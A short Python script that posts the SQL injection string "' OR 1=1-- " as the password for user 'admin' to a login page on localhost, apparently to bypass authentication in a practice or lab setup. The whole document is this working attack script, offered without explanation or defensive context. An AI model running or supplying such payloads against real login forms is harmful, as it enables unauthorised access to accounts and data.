import requests

payload = {
  'id':       'admin',
  'password': '\' OR 1=1-- '
}

r = requests.post('http://localhost:8080/login.php', data=payload)
print(r.text)